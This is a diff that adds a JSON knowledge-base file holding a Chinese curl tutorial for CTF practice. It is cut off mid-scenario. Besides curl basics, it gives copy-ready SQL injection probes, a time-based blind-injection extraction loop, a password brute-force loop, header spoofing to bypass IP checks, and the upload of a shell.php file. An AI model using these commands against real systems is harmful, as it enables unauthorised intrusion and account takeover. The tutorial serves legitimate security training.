@@ -1,0 +1,588 @@
+{
+  "id": "tools",
+  "name": "工具与速查手册",
+  "icon": "🧰",
+  "groups": [
+    {
+      "id": "g-curl",
+      "name": "curl 指令教程",
+      "intro": "零基础到能用：从第一个请求到 CTF 实战的完整 curl 教程（5 课），每个参数都有例子，照着抄就能跑。",
+      "entries": [
+        {
+          "id": "curl-01-install",
+          "title": "第 1 课：curl 是什么？怎么装？第一个请求",
+          "tags": [
+            "curl",
+            "教程",
+            "安装",
+            "基础"
+          ],
+          "aliases": [
+            "curl安装",
+            "curl是什么",
+            "第一个curl请求",
+            "curl指令教程",
+            "curl 教程",
+            "curl从零开始"
+          ],
+          "difficulty": "easy",
+          "summary": "零基础第 1 课：curl 是什么、怎么装、发出第一个请求、看懂一条命令",
+          "content": "\n#### 这个条目的作用\n一句话：curl 是一个在终端（黑窗口）里「替你去访问网址」的命令行工具。你在浏览器地址栏输入网址、按回车，浏览器会向服务器发一个 HTTP 请求，然后把服务器返回的内容渲染成网页；curl 干的是同一件事，但它**不用鼠标、不用图形界面**，全靠打字，而且它会把服务器返回的**原始内容**（HTML 源码、JSON 数据、响应头……）一字不改地打印在终端里。\n\n为什么 CTF 里非用它不可？因为浏览器把太多东西「藏」起来了：你看到的页面是渲染后的，而漏洞利用需要看到**最原始的请求和响应**；浏览器还会自动加一堆请求头、自动跳转、自动处理 Cookie，这些「贴心」反而会挡住你看真相。curl 默认什么都不加、什么都不自动做，你让它发什么它就发什么，所以它是 Web 方向最基础、最常用、最该先学会的命令。\n\n> [!info] 类比：浏览器是「点外卖的 App」，curl 是「直接打电话给餐厅」。App 帮你把菜单排好、图片加载好；电话里你听到的是原汁原味的声音。CTF 要的就是「原汁原味」。\n\n#### 前置条件\n- 一台电脑（Windows / Linux / macOS 都行），能打开终端（黑窗口）。\n- 不用装任何开发环境，只要 curl 本身。\n- 建议准备一个「靶机地址」用来练习：例如 `http://example.com`（公网示例站）或你正在打的靶机 `http://1.2.3.4:8080/`。\n\n#### 第 1 步：确认 curl 已经装好\n打开终端，输入下面这条命令，回车：\n```bash\ncurl --version\n```\n预期结果：屏幕打印出 `curl 8.x.x (...) libcurl/...` 之类的版本信息。看到它，说明你的 curl 已经能用了，直接跳到第 2 步。\n\n如果不行：\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| `'curl' 不是内部或外部命令` / `curl: command not found` | Windows 老系统没带 curl，或 Linux 没装 | Windows 10/11 自带 curl；还不行就装个 git-bash（自带 curl）；Linux 用 `sudo apt install curl`（Debian/Ubuntu）或 `sudo yum install curl`（CentOS）；macOS 自带 |\n| 提示权限不足 | 当前用户没权限 | Linux/macOS 加 `sudo` 再试 |\n\n#### 第 2 步：发出人生第一个请求\n在终端里输入（`example.com` 是官方示例域名，随便访问）：\n```bash\ncurl http://example.com\n```\n预期结果：终端里哗啦啦打印出一大段英文文本，开头长这样：\n```html\n<!doctype html>\n<html>\n<head>\n    <title>Example Domain</title>\n...\n```\n这就是 `example.com` 这个网页的**原始 HTML 源码**——和你在浏览器里「右键 → 查看网页源代码」看到的是同一份东西。curl 不做任何美化，源码长什么样它就打印什么样。\n\n如果不行：\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| `curl: (6) Could not resolve host: example.com` | 域名解析失败（没联网 / DNS 有问题） | 检查网络；换 `curl http://114.114.114.114`（一个 IP，不经过域名解析）试试网络通不通 |\n| `curl: (7) Failed to connect ... Connection refused` | 目标服务器没开 / 端口不对 | 靶机没启动？URL 端口写错？先确认服务在跑 |\n| `curl: (28) Operation timed out` | 连接超时（网络不通或目标不响应） | 换网络 / 换目标；靶机地址确认过没 |\n| 打印了一堆看不懂的乱码 | 服务器返回的是二进制或压缩内容 | 正常，第 2 课教你看懂它 |\n\n#### 第 3 步：看懂一条命令的组成\n刚才那条命令拆开看：\n```txt\ncurl    http://example.com\n└─工具名  └─目标地址（URL）\n```\ncurl 的万能句式只有一句：\n```txt\ncurl [参数们] 网址\n```\n- `curl` 是工具名，固定不变。\n- `[参数们]` 是可选的一堆「开关」，以 `-` 开头（比如 `-s`、`-i`），控制「怎么发请求」，可以写一个也可以写一串，顺序无所谓。没有参数也行。\n- `网址` 就是要访问的目标，**必须写在最后**（参数后面）。\n\n#### 第 4 步：URL 长什么样？（一个网址的五个部分）\n以 `http://1.2.3.4:8080/admin/login.php?user=admin&page=2#top` 为例：\n| 部分 | 例子 | 意思 |\n|---|---|---|\n| 协议 | `http://` | 用什么方式通信。`http` / `https` 最常见；打靶机常见 `http://` |\n| 域名或 IP | `1.2.3.4` | 服务器在哪。可以是 IP，也可以是 `example.com` 这种域名 |\n| 端口 | `:8080` | 服务器上哪个门。**不写默认走 80（http）或 443（https）**，靶机经常用 8000/8080/8888 这种非常规端口，必须写 |\n| 路径 | `/admin/login.php` | 服务器上哪个文件/接口 |\n| 参数 | `?user=admin&page=2` | 问号后面是 GET 参数，`&` 分隔多个键值对，就是「我要按这个条件查询」 |\n| 锚点 | `#top` | 浏览器用的「页内定位」，**服务器根本收不到**，curl 里不用管 |\n\n#### 第 5 步：URL 什么时候要加引号？（90% 的新手栽在这里）\n把网址用双引号包起来，永远没错：\n```bash\ncurl \"http://1.2.3.4:8080/?a=1&b=2\"\n```\n必须加引号的情况：\n1. **网址里有 `&`**（GET 参数不止一个时）：不加引号，终端会把 `&` 当成「后台运行」的符号，命令直接废掉。\n2. **网址里有中文或空格**：终端会把空格当成「下一个参数」。\n3. **网址里有 `*`、`?` 等特殊符号**：终端可能会去「通配」。\n\n> [!tip] 养成习惯：凡是带参数的 URL 一律加双引号。多打两个引号，少踩一堆坑。\n\n#### 常见错误与排查\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| `curl: command not found` | 没装 curl | 看第 1 步的解决表 |\n| `Could not resolve host` | 域名解析失败 | 查网络 / 查域名拼写 |\n| `Failed to connect` | 目标没起 / 端口错 | 确认靶机与端口 |\n| `Empty reply from server` | 服务器回了但没内容（或协议不对） | 试 `http://` 和 `https://`；靶机可能需要加端口 |\n| 输出乱码 / 二进制 | 内容是压缩或非文本 | 之后学 `-H \"Accept-Encoding: identity\"`，或直接看第 2 课 |\n\n#### 实战要点\n- **先 `curl --version` 确认能用**，再开始练，别在「工具没装好」上浪费时间。\n- 第一次跑通一个请求后，把它和浏览器地址栏对照着看：地址栏输入的网址 = curl 里的 URL。\n- 参数不熟没关系，第 2 课开始逐个学；**记不住参数名就记住这条句式：`curl [参数们] 网址`**。"
+        },
+        {
+          "id": "curl-02-basic",
+          "title": "第 2 课：最常用参数速查（每个都带例子）",
+          "tags": [
+            "curl",
+            "参数",
+            "速查",
+            "常用参数"
+          ],
+          "aliases": [
+            "curl参数",
+            "curl -s",
+            "curl -i",
+            "curl -I",
+            "curl -L",
+            "curl -k",
+            "curl -o",
+            "curl -v",
+            "curl参数大全",
+            "curl flags"
+          ],
+          "difficulty": "easy",
+          "summary": "curl 最常用的 15 个参数逐个讲透：-s -i -I -o -O -L -k -v -X -d -H -b -c -u -m -w，每个都带例子和预期输出",
+          "content": "\n#### 这个条目的作用\n参数（也叫选项/flag）就是给 curl 的「开关」，写在 `curl` 和网址之间，控制请求怎么做。本课把**最常用的 15 个**逐个讲透，每个都给例子和「输出长什么样」。学完这一课，日常 90% 的 curl 用法你就都会了。\n\n先记住两条规律：\n1. **参数写在 `curl` 和网址之间**：`curl -s -i http://x` 这种。\n2. **短参数可以连写**：`curl -s -i` 可以写成 `curl -si`（个别例外，下面会标）。\n\n#### 前置条件\n- 能跑通第 1 课的 `curl http://example.com`。\n- 一个终端 + 一个能访问的网址（继续用 `http://example.com` 或靶机地址都行）。\n\n#### 第 1 步：两个「安静」参数：-s 和 -S\n```bash\ncurl -s http://example.com\n```\n`-s` = silent（静默）：把进度条和一切「过程提示」都关掉，**只输出服务器返回的内容**。不加 `-s` 时 curl 会在终端里显示一个下载进度条，内容一多屏幕就花了，所以**脚本和复制粘贴时永远带上 `-s`**。\n\n`-S` = show-error：单独用没意义，必须和 `-s` 配合：\n```bash\ncurl -sS http://example.com\n```\n含义：静默 + 但出错时把错误信息显示出来。平时推荐直接写 `-sS` 两个一起上：正常时干净，出错时不至于一脸懵。\n\n预期结果：两种写法都只打印网页源码，干净利落。\n如果不行：没有输出且没报错 → 试试 `curl -sS -v http://example.com`（`-v` 本课第 6 步讲），看它到底连没连上。\n\n#### 第 2 步：看响应头和响应体：-i 和 -I\n服务器回应你时，分两部分：**响应头**（一堆 `Key: Value` 的说明信息）和**响应体**（真正的内容）。\n```bash\ncurl -i http://example.com\n```\n`-i` = include：把**响应头 + 响应体**一起打印出来。响应头长这样：\n```txt\nHTTP/1.1 200 OK\nContent-Type: text/html; charset=UTF-8\nDate: ...\n```\n预期结果：最上面几行是响应头，空一行之后是网页源码（响应体）。\n如果不行：只想看头不想看体 → 用 `-I`。\n\n```bash\ncurl -I http://example.com\n```\n`-I` = head：只发送一个 HEAD 请求，**只拿响应头，不拿内容**。常用于快速探测：目标存不存在、什么状态码、什么服务器（nginx/apache）、响应头里有没有奇怪的东西。\n预期结果：只打印那几行响应头，没有正文。\n如果不行：有些服务器不支持 HEAD（少见），返回空或错误，改用 `-i` 自己看。\n\n> [!tip] 信息收集三板斧：`curl -I http://target/`（看头）→ `curl -s http://target/robots.txt`（看敏感文件）→ `curl -s http://target/ | grep -i \"关键字\"`（在源码里搜东西）。`-i` 是 CTF 里用得最多的参数之一。\n\n#### 第 3 步：保存和下载：-o 与 -O\n```bash\ncurl -s -o out.html http://example.com\n```\n`-o 文件名` = output：把响应体**存进文件**，而不是打印到屏幕（`-s` 静默后屏幕更干净）。想慢慢看下载的内容时最常用：先 `-o` 存下来再看。\n预期结果：终端无输出，当前目录多了个 `out.html` 文件，`cat out.html` 能看到内容。\n\n```bash\ncurl -s -O http://example.com/backup.zip\n```\n`-O`（大写）= remote-name：按服务器给的文件名**原样保存**。URL 里文件名是啥，存下来就叫啥（这里是 `backup.zip`）。\n预期结果：当前目录出现 `backup.zip`。\n如果不行：`curl: (22) The requested URL returned error: 404` → 文件不存在或路径写错，先 `-I` 探一下。\n\n#### 第 4 步：跟着跳转走：-L\n有些网址访问后会「重定向」（服务器说：你要的东西在别处，去 `/login`）。默认情况下 **curl 不跟**，只把「去别处」的提示返回给你：\n```bash\ncurl -s http://example.com/redirect   # 假如这个地址会跳转\n```\n预期结果：返回的可能是一小段空 HTML 或 301/302 提示，而不是最终页面。\n加上 `-L`（location）让它自动跟着跳：\n```bash\ncurl -sL http://example.com/redirect\n```\n`-L` = location：自动跟随所有重定向，直到拿到最终内容。登录后跳转、短链接、http 跳 https 都要靠它。\n预期结果：直接看到最终页面的内容。\n\n#### 第 5 步：跳过 HTTPS 证书检查：-k\n访问 https 网站时 curl 会检查它的证书，证书有问题（自签名、过期、靶机常见）就会拒绝连接：\n```bash\ncurl -s https://target.example/   # 可能报证书错误\ncurl -sk https://target.example/  # 跳过证书检查\n```\n`-k` = insecure：**不检查服务器证书**。CTF 靶机几乎全是自签名证书，所以 `-sk` 组合在打靶时出场率极高。\n预期结果：`-sk` 能正常返回内容，而裸 `-s` 报 `SSL certificate problem`。\n如果不行：还报 SSL 错误 → 看第 5 课排错表（可能还涉及 TLS 版本，加 `--tlsv1.2` 试试）。\n\n#### 第 6 步：全程直播：-v\n```bash\ncurl -v http://example.com\n```\n`-v` = verbose（啰嗦）：把**整个通信过程**打印出来——连接了哪个 IP、发了哪些请求头、收到哪些响应头。这是分析问题、理解 HTTP 的万能钥匙，第 5 课会逐行拆解，本课先认识它。\n预期结果：输出里出现很多以 `*`、`>`、`<` 开头的行（`>` 是你发出去的，`<` 是服务器回过来的）。\n\n#### 常用参数总表（背这张就够）\n| 参数 | 全称含义 | 作用 | 最常用例子 |\n|---|---|---|---|\n| `-s` | silent | 关掉进度条等废话，只输出内容 | `curl -s http://x` |\n| `-S` | show-error | 配 `-s` 用，出错时显示错误 | `curl -sS http://x` |\n| `-i` | include | 输出带响应头 | `curl -si http://x` |\n| `-I` | head | 只发 HEAD 请求拿响应头 | `curl -I http://x` |\n| `-o 文件` | output | 把响应体存成文件 | `curl -s -o a.html http://x` |\n| `-O` | remote-name | 按 URL 里的文件名保存 | `curl -sO http://x/backup.zip` |\n| `-L` | location | 自动跟随重定向 | `curl -sL http://x` |\n| `-k` | insecure | 跳过 HTTPS 证书检查 | `curl -sk https://x` |\n| `-v` | verbose | 打印完整通信过程 | `curl -v http://x` |\n| `-X 方法` | request | 指定请求方法（GET/POST/PUT…） | `curl -X POST http://x` |\n| `-d 数据` | data | 发送表单数据（自动变 POST） | `curl -d \"a=1\" http://x` |\n| `-H 头` | header | 自定义请求头 | `curl -H \"Cookie: a=1\" http://x` |\n| `-b 内容` | cookie | 携带 Cookie | `curl -b \"PHPSESSID=abc\" http://x` |\n| `-c 文件` | cookie-jar | 把收到的 Cookie 存进文件 | `curl -c cookies.txt http://x` |\n| `-u 账号:密码` | user | 基本认证（Basic Auth） | `curl -u admin:123 http://x` |\n| `-m 秒数` | max-time | 总超时时间（秒），防止卡死 | `curl -m 5 http://x` |\n| `-w 格式` | write-out | 输出结束后打印指定信息 | `curl -s -o /dev/null -w \"%{http_code}\" http://x` |\n| `-x 代理` | proxy | 走代理（挂 Burp 用） | `curl -x http://127.0.0.1:8080 http://x` |\n\n（`-X`、`-d`、`-H`、`-b`、`-c` 会在第 3 课实战展开；`-w`、`-x` 在第 5 课展开。）\n\n#### 常见错误与排查\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| 没加 `-s` 时屏幕有进度条 | 正常现象 | 加 `-s` |\n| `-i` 和 `-I` 记混 | 一个拿「头+体」，一个只拿「头」 | `-i` 小写 i 是 include（全都要）；`-I` 大写 I 是 head（只要头） |\n| `curl: option -X: ...` 拼写错误 | 参数写错 | 参数严格区分大小写：`-i` ≠ `-I`，`-o` ≠ `-O` |\n| 下载的文件是 HTML 而不是想要的文件 | 服务器返回了错误页 | `cat 文件` 看看内容，多半是 404 页面 |\n\n#### 实战要点\n- **打靶默认起手：`curl -sk` + `-i`**，一条命令看清状态码、响应头和内容：`curl -ski http://target/`。\n- 参数顺序无所谓，`curl -s -i` 和 `curl -i -s` 完全一样。\n- 背参数总表比背任何教程都值：做题时扫一眼表格就能拼出想要的命令。"
+        },
+        {
+          "id": "curl-03-post",
+          "title": "第 3 课：POST 与数据提交（表单、JSON、上传、请求头）",
+          "tags": [
+            "curl",
+            "POST",
+            "请求头",
+            "Cookie",
+            "上传",
+            "数据提交"
+          ],
+          "aliases": [
+            "curl post",
+            "curl -d",
+            "curl -H",
+            "curl 表单",
+            "curl json",
+            "curl cookie",
+            "curl 登录",
+            "curl -F",
+            "curl -b",
+            "curl -c",
+            "curl 上传"
+          ],
+          "difficulty": "easy",
+          "summary": "POST 请求完整实战：表单提交、JSON 接口、请求头、Cookie 会话模拟登录、文件上传，最后串成「登录→拿 flag」完整流程",
+          "content": "\n#### 这个条目的作用\n前面两课发的是 GET 请求（把信息放在网址里问服务器要东西）。但 CTF 里大量操作是**提交数据**：登录、发评论、打接口、传参数——这些都靠 POST 请求（把数据放在请求的「身体」里发给服务器）。本课教你用 curl 发 POST、传表单、传 JSON、带 Cookie 模拟登录、上传文件，全是打靶刚需。\n\n先理解 GET 和 POST 的区别：\n| 对比 | GET | POST |\n|---|---|---|\n| 数据放哪 | URL 的参数里（`?a=1&b=2`） | 请求体里（URL 干干净净） |\n| 看得见吗 | 网址栏全暴露 | 网址栏看不见，在请求体里 |\n| 典型用途 | 查资料、看页面 | 登录、提交、上传、改数据 |\n| 长度限制 | 短（URL 有长度限制） | 长（可以传文件） |\n\n> [!info] 记法：GET = 「去要」（Get），POST = 「寄出去」（Post）。你要「寄」点东西给服务器，就用 POST。\n\n#### 前置条件\n- 会第 1、2 课的 `curl -s` 基础用法。\n- 一个可以提交数据的练习目标：登录页（如靶机的 `/login.php`）、任意一个提交表单的页面。\n- 会看第 2 课参数总表里的 `-X` / `-d` / `-H` / `-b` / `-c`。\n\n#### 第 1 步：最基础的 POST：-d\n```bash\ncurl -X POST http://target/login.php -d \"username=admin&password=123456\"\n```\n拆解：\n- `-X POST`：明确告诉 curl 用 POST 方法。\n- `-d \"username=admin&password=123456\"`：要发送的数据，格式和 URL 参数一样（`键=值&键=值`），**会自动加上 `Content-Type: application/x-www-form-urlencoded` 请求头**——这是网页表单的默认格式，90% 的登录框都用它。\n\n预期结果：服务器返回登录成功/失败的页面内容。\n如果不行：返回 405 Method Not Allowed → 这个接口不接受 POST，试试 GET；返回空/错误 → 参数名可能不对（`username` 也许叫 `user`/`name`，看源码或抓包确认）。\n\n> [!tip] 有个偷懒点：只要写了 `-d`，curl 就**自动当成 POST**，`-X POST` 可以省略：`curl -d \"a=1\" http://x` 就是 POST。但有些题目/服务器对方法敏感，所以建议新手还是把 `-X POST` 写上，显式、不会错。\n\n#### 第 2 步：数据里有特殊字符？用 --data-urlencode\n如果数据里有中文、空格、`&`、`=` 等字符，直接塞进 `-d` 里可能被理解错（比如密码里带 `&`，会被当成「两个参数」）。安全的做法是让 curl 帮你编码：\n```bash\ncurl -X POST http://target/login.php --data-urlencode \"username=admin\" --data-urlencode \"password=p@ss&word\"\n```\n`--data-urlencode \"键=值\"`：自动把值做 URL 编码后再发送。\n预期结果：服务器收到的密码是完整的 `p@ss&word`，而不是被 `&` 拆开。\n如果不行：接口要求别的字段名，对照源码/抓包改键名。\n\n#### 第 3 步：发 JSON 数据：-H + -d 组合\n很多新一点的接口（尤其是 API）用 JSON 格式收发数据，此时必须手动指定 `Content-Type: application/json`，否则服务器看不懂你发的格式：\n```bash\ncurl -X POST http://target/api/login -H \"Content-Type: application/json\" -d '{\"username\":\"admin\",\"password\":\"123456\"}'\n```\n拆解：\n- `-H \"Content-Type: application/json\"`：告诉服务器「我发的身体是 JSON」。\n- `-d '{\"username\":\"admin\",...}'`：数据本身写成 JSON 字符串（键和值都要双引号，外层用**单引号**包住，这样里面的双引号不用转义）。\n\n预期结果：接口返回 JSON（`{\"code\":200,...}`）或按接口逻辑响应。\n如果不行：返回 400/415 → 请求头 Content-Type 不对或 JSON 格式错（少逗号、多引号）；返回 500 → 参数名/类型和接口对不上。\n\n> [!warn] 在 Windows 的 cmd 里，单引号 `'` 不是字符串定界符，JSON 里的双引号要写成 `\\\"`：`curl -d \"{\\\"a\\\":\\\"b\\\"}\" ...`。Linux/macOS 的 bash 里用单引号最省事。要是嫌转义烦，先把 JSON 存进文件再发：`curl -d @data.json -H \"Content-Type: application/json\" http://x`（`@文件名` 表示从文件读数据）。\n\n#### 第 4 步：带请求头：-H 详解\n`-H` 可以加任意请求头，写多个就多写几个 `-H`：\n```bash\ncurl -s http://target/admin/ -H \"Cookie: PHPSESSID=abc123\" -H \"X-Forwarded-For: 127.0.0.1\" -H \"Referer: http://target/admin/\"\n```\n常用场景：\n| 请求头 | 用途 | 例子 |\n|---|---|---|\n| `Cookie: ...` | 带上登录态/会话 | `-H \"Cookie: PHPSESSID=abc123\"`（等价于 `-b`） |\n| `User-Agent: ...` | 伪装浏览器/绕过 UA 检测 | `-H \"User-Agent: Mozilla/5.0 ...\"`（默认会暴露是 curl） |\n| `Referer: ...` | 伪造来源页（防盗链、CSRF 校验） | `-H \"Referer: http://target/index.php\"` |\n| `X-Forwarded-For: ...` | 伪造来源 IP（绕 IP 限制） | `-H \"X-Forwarded-For: 127.0.0.1\"` |\n| `Content-Type: ...` | 声明请求体格式 | `-H \"Content-Type: application/json\"` |\n| `Authorization: ...` | 带 token（JWT 等） | `-H \"Authorization: Bearer eyJhbGciOi...\"` |\n\n预期结果：服务器把你当「带权限/带伪装」的请求处理。\n如果不行：还是 403/跳登录 → 服务端可能校验了别的头（Origin、Sec-*），用 Burp 抓一次正常浏览器的请求对比着抄。\n\n#### 第 5 步：Cookie 会话：-c 存、-b 带（模拟登录）\n登录类题目的标准流程：先 POST 登录拿 Cookie → 再带 Cookie 访问需要登录才能看的页面。curl 用两个参数配合：\n```bash\n# 1) 登录，把服务器发来的 Cookie 存进 cookies.txt\ncurl -s -c cookies.txt -X POST http://target/login.php -d \"username=admin&password=123456\"\n\n# 2) 带 Cookie 访问需要登录态的页面\ncurl -s -b cookies.txt http://target/flag.php\n```\n- `-c cookies.txt`：cookie-jar，把服务器 `Set-Cookie` 的头**保存**到文件。\n- `-b cookies.txt`：把这个文件里的 Cookie 原样**带上**。\n\n预期结果：第 2 步能访问到未登录时 403/跳转的页面。\n如果不行：登录没成功（看第 1 步的排查）→ Cookie 文件是空的，`cat cookies.txt` 确认；有些题 Cookie 值不固定或还有别的校验，配合 `-v` 观察。\n\n也可以不存文件，直接手写 Cookie：\n```bash\ncurl -s http://target/flag.php -b \"PHPSESSID=abc123; admin=1\"\n```\n`-b \"键=值; 键=值\"`：直接带一串 Cookie，多个用 `;` 分隔（和浏览器里的 Cookie 写法一样）。当你从别的途径（Burp、源码）拿到了 Cookie 值，就用这种。\n\n#### 第 6 步：上传文件：-F\n```bash\ncurl -X POST http://target/upload.php -F \"file=@/home/user/shell.php\"\n```\n`-F \"字段名=@本地文件路径\"`：以 `multipart/form-data` 格式（网页上传文件的格式）发送，`@` 后面跟本地文件路径，文件内容会被读进去。\n预期结果：服务器按上传逻辑响应（成功/失败提示）。\n如果不行：上传报错 → 字段名不对（是 `file` 还是 `upload`？看表单源码）；文件被过滤 → 那是题目的 WAF 逻辑，属于「文件上传」专题的内容。\n\n#### 第 7 步：完整实战：登录 → 带会话 → 拿 flag\n把上面串成一个真实流程（假设靶机 `http://10.0.0.5:8080/`，登录接口 `/api/login`，需要登录的接口 `/api/flag`）：\n```bash\n# 1) 登录并保存 Cookie（JSON 接口）\ncurl -s -c ck.txt -X POST http://10.0.0.5:8080/api/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\":\"admin\",\"password\":\"123456\"}'\n\n# 2) 带 Cookie 请求 flag 接口\ncurl -s -b ck.txt http://10.0.0.5:8080/api/flag\n```\n预期结果：第 1 步返回 `{\"code\":200,...}` 之类的成功信息并生成 `ck.txt`；第 2 步返回包含 flag 的数据。\n如果不行：第 1 步没成功 → 检查参数名/Content-Type/密码；第 1 步成功但第 2 步还 401/403 → 服务端可能不认 Cookie 文件里的格式，或需要额外请求头，用 `curl -v -b ck.txt` 对比浏览器请求慢慢找差异。\n\n#### 常见错误与排查\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| 写了 `-d` 还是 GET | 记错写法 | 写了 `-d` 就会自动 POST；显式加 `-X POST` 更稳 |\n| 中文变成乱码 | 没做 URL 编码 | 用 `--data-urlencode` |\n| JSON 接口报 400 | Content-Type 不是 application/json 或 JSON 语法错 | 加 `-H \"Content-Type: application/json\"`；检查引号配对 |\n| 登录成功但访问不了 | Cookie 没带上/没存上 | `-b` 带上；`-c` 存了没有；`cat ck.txt` 检查 |\n| 上传 500 | 字段名或文件路径错 | 字段名对照表单；`@` 路径写全 |\n| 密码里有 `&` 结果登录失败 | `&` 被当成参数分隔 | `--data-urlencode` 或对值做 URL 编码 |\n\n#### 实战要点\n- **万能登录流程**：`-c` 存 Cookie → `-b` 带 Cookie，两步走，CTF 里至少一半的题用得上。\n- `-H` 是「加戏」工具：绕过 UA 检测、伪造 IP、带 token，全靠它，做题时缺什么头就加什么头。\n- 不会的参数名没关系：**用 Burp 抓一次浏览器的正常请求，右键 → Copy as curl command，能一键生成 curl 命令**，照着改就行。\n- 大批量提交（爆破、遍历）别手打，配合 for 循环，见第 4 课。"
+        },
+        {
+          "id": "curl-04-ctf",
+          "title": "第 4 课：CTF 打靶实战场景汇总",
+          "tags": [
+            "curl",
+            "CTF",
+            "实战",
+            "打靶",
+            "爆破",
+            "盲注",
+            "信息收集"
+          ],
+          "aliases": [
+            "curl 打靶",
+            "curl 实战",
+            "curl 爆破",
+            "curl 盲注",
+            "curl 时间盲注",
+            "curl 下载",
+            "curl 代理",
+            "curl 登录"
+          ],
+          "difficulty": "medium",
+          "summary": "8 个打靶直接能抄的场景：信息收集四连、登录拿 Cookie、SQL 注入手测、时间盲注计时、循环爆破、下载源码、挂 Burp 代理、--resolve 直连内网",
+          "content": "\n#### 这个条目的作用\n前 3 课学了招式，本课把它们组合成**打靶时直接能抄的场景命令**。每个场景给「目的 → 命令 → 怎么看结果」，覆盖信息收集、登录态、注入手测、时间盲注、爆破、下载、代理转发等 CTF 高频动作。看到题目就翻对应场景，照抄改 URL 就能用。\n\n> [!info] 通用约定：下面所有命令里，`target` 都换成你的靶机地址（如 `http://1.2.3.4:8080`）。打靶默认加 `-sk`（静默+跳过证书），需要看头时再加 `-i`。\n\n#### 场景 1：信息收集四连（起手式）\n```bash\n# 响应头 + 状态码（一眼看出服务器类型、技术栈）\ncurl -ski http://target/\n\n# robots.txt（经常藏着后台路径）\ncurl -sk http://target/robots.txt\n\n# 常见敏感文件\ncurl -sk http://target/.git/config\ncurl -sk http://target/backup.zip\ncurl -sk http://target/flag.php\n\n# 在页面源码里搜关键词\ncurl -sk http://target/ | grep -iE \"flag|admin|password|token|<!--\"\n```\n预期结果：响应头暴露 nginx/php 版本；robots.txt 给出 Disallow 路径；源码注释里直接有提示。\n如果不行：404 是常态，别一个个死磕，换工具批量扫目录（见知识库「目录扫描」条目）。\n\n#### 场景 2：登录 → 带 Cookie → 拿数据（最常见流程）\n```bash\n# 登录并保存会话\ncurl -sk -c ck.txt -X POST http://target/api/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\":\"admin\",\"password\":\"123456\"}'\n\n# 带会话访问\ncurl -sk -b ck.txt http://target/api/flag\n\n# 或者直接手写 Cookie（比如从源码/抓包拿到的 admin=1）\ncurl -sk http://target/admin/ -b \"admin=1; PHPSESSID=abc\"\n```\n预期结果：第二步拿到登录后才可见的数据。\n如果不行：先 `cat ck.txt` 看 Cookie 存没存上；再 `curl -v -b ck.txt` 对比浏览器请求。\n\n#### 场景 3：SQL 注入手测（配合 URL 编码）\n```bash\n# 探测：加单引号看是否报错/行为变化\ncurl -sk \"http://target/?id=1'\"\n# 布尔判断：真条件 vs 假条件页面是否不同\ncurl -sk \"http://target/?id=1 AND 1=1\"\ncurl -sk \"http://target/?id=1 AND 1=2\"\n# 时间盲注探测：sleep 一下看是否延迟（-m 防卡死）\ncurl -sk -m 10 \"http://target/?id=1 AND sleep(5)\"\n```\n预期结果：`1'` 报错或行为异常说明有注入点；真/假条件页面不同说明布尔注入成立；sleep 请求明显变慢说明时间盲注成立。\n如果不行：空格被过滤 → 用 `/**/` 或 `%09` 等替换（见知识库「SQL 过滤绕过」条目）；参数名不对 → 翻源码确认是 `id` 还是别的。\n注意：`AND` 里的空格在 URL 里可以原样发，但有些 WAF/解析器敏感，稳妥起见把空格编码成 `%20`。\n\n#### 场景 4：时间盲注计时（-w 输出耗时）\n盲注判断「成立/不成立」最精确的方式是**测响应耗时**，curl 的 `-w` 能直接打印用时：\n```bash\n# 打印这次请求花了多少秒（-o /dev/null 表示丢弃内容只留计时）\ncurl -s -o /dev/null -w \"%{time_total}\\n\" \"http://target/?id=1 AND sleep(5)\"\n# 正常请求的基准耗时\ncurl -s -o /dev/null -w \"%{time_total}\\n\" \"http://target/?id=1\"\n```\n预期结果：第一条输出接近 `5.00`（睡了 5 秒），第二条输出 `0.0x`。耗时差 5 秒 = 注入成立。\n如果不行：两条都是 0.0x → sleep 没执行（可能被过滤/参数没进 SQL）；两条都很慢 → 网络慢，先测基准值再说。\n再配合 bash 循环就能逐字符盲注取数（把 `substr(...)` 里的猜测逻辑换掉）：\n```bash\nfor c in $(seq 32 126); do\n  t=$(curl -s -o /dev/null -w \"%{time_total}\" \"http://target/?id=1 AND if(ascii(substr(database(),1,1))=$c,sleep(2),0)\")\n  echo \"$c -> $t\"\ndone | sort -t'>' -k2 -rn | head -1\n```\n预期结果：耗时最长的那行对应的数字，就是 database() 第一个字符的 ASCII 码。\n（更省事：直接上 sqlmap，本知识库有 sqlmap 条目。手测只是为了确认注入点存在。）\n\n#### 场景 5：一句话爆破（循环 + 字典）\n```bash\n# 弱口令爆破登录接口（字典文件 pass.txt，每行一个密码）\nwhile read p; do\n  code=$(curl -s -o /dev/null -w \"%{http_code}\" -X POST http://target/login.php -d \"user=admin&pass=$p\")\n  echo \"$p -> $code\"\ndone < pass.txt\n\n# 如果登录成功会跳转到别的页面，判断条件改成 grep 关键字：\nwhile read p; do\n  if curl -s -X POST http://target/login.php -d \"user=admin&pass=$p\" | grep -q \"welcome\"; then\n    echo \"FOUND: $p\"\n    break\n  fi\ndone < pass.txt\n```\n预期结果：某个密码返回的状态码/页面内容与众不同，就是正确答案。\n如果不行：登录接口有验证码/频率限制 → 换 Hydra 或 Burp Intruder（知识库有专门条目）；判断关键字找不准 → 先用浏览器登录一次成功，记下成功页面的独有字符串。\n\n#### 场景 6：下载文件与源码备份\n```bash\n# 按原文件名下载（备份文件泄露的经典动作）\ncurl -skO http://target/backup.zip\ncurl -skO http://target/index.php.bak\n# 改名保存（源码泄露：把 .php 当文本读）\ncurl -sk -o index.txt http://target/index.php\n# 断点续传大文件（-C - 表示从上次进度继续）\ncurl -sk -C - -O http://target/big.zip\n```\n预期结果：文件落地，`file backup.zip` 或 `cat index.txt` 确认内容。\n如果不行：404 → 文件不存在或路径要 fuzz；下载下来是 HTML → 服务器拦了，`cat` 看是啥错误页。\n\n#### 场景 7：挂代理看流量（配合 Burp）\n本地开着 Burp（默认监听 127.0.0.1:8080）时，让 curl 走代理，Burp 里就能看到完整请求，方便改包重放：\n```bash\ncurl -sk -x http://127.0.0.1:8080 \"http://target/?id=1\"\n```\n预期结果：Burp 的 HTTP history 里出现这条请求，可以右键 Repeater/改包。\n如果不行：Burp 没开或端口不是 8080 → 改 `-x 